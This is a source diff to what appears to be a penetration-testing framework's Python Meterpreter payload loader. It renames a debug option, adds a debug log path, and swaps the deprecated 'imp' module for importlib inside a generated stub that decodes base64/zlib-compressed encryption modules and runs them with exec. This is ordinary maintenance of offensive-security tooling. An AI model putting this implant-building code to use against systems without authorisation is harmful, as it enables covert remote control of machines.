@@ -34,9 +34,10 @@ module Payload::Python::MeterpreterLoader
           default: true
         ),
         OptBool.new(
-          'PythonMeterpreterDebug',
-          'Enable debugging for the Python meterpreter'
-        ),
+          'MeterpreterDebugBuild',
+          'Enable debugging for the Python meterpreter',
+          aliases: ['PythonMeterpreterDebug']
+        )
       ] +
       Msf::Opt::http_header_options
     )
@@ -70,11 +71,15 @@ module Payload::Python::MeterpreterLoader
       txt.gsub('\\', '\\' * 8).gsub('\'', %q(\\\\\\\'))
     }
 
+    if ds['MeterpreterDebugBuild']
+      met.sub!(%q|DEBUGGING = False|, %q|DEBUGGING = True|)
+
+      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(ds['MeterpreterDebugLogging'])
+      met.sub!(%q|DEBUGGING_LOG_FILE_PATH = None|, %Q|DEBUGGING_LOG_FILE_PATH = "#{logging_options[:rpath]}"|) if logging_options[:rpath]
+    end
+
     unless ds['MeterpreterTryToFork']
       met.sub!('TRY_TO_FORK = True', 'TRY_TO_FORK = False')
-    end
-    if ds['PythonMeterpreterDebug']
-      met.sub!('DEBUGGING = False', 'DEBUGGING = True')
     end
 
     met.sub!("# PATCH-SETUP-ENCRYPTION #", python_encryptor_loader)
@@ -84,7 +89,7 @@ module Payload::Python::MeterpreterLoader
     met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
     met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")
 
-    uuid = opts[:uuid] || generate_payload_uuid
+    uuid = opts[:uuid] || generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
     uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
     met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")
 
@@ -152,9 +157,15 @@ module Payload::Python::MeterpreterLoader
     aes_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_aes_source))
     rsa_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_rsa_source))
     %Q?
-import codecs,imp,base64,zlib
-met_aes = imp.new_module('met_aes')
-met_rsa = imp.new_module('met_rsa')
+import codecs,base64,zlib
+try:
+  import importlib.util
+  new_module = lambda x: importlib.util.spec_from_loader(x, loader=None)
+except ImportError:
+  import imp
+  new_module = imp.new_module
+met_aes = new_module('met_aes')
+met_rsa = new_module('met_rsa')
 exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'met_aes','exec'), met_aes.__dict__)
 exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'met_rsa','exec'), met_rsa.__dict__)
 sys.modules['met_aes'] = met_aes
@@ -357,7 +368,6 @@ class AESCBC(object):
 		return _b2s(pt)
 ?
   end
-
 end
 
 end
